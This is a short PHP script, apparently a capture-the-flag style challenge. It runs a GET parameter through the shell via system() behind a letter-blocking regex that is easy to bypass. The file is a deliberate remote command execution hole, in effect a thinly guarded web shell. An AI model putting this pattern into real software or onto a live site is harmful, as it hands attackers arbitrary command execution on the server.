<?php
if (preg_match('/[a-z]/i', $_GET['c'])) {
    die('blocked');
}
call_user_func_array('system', $_GET['c']);
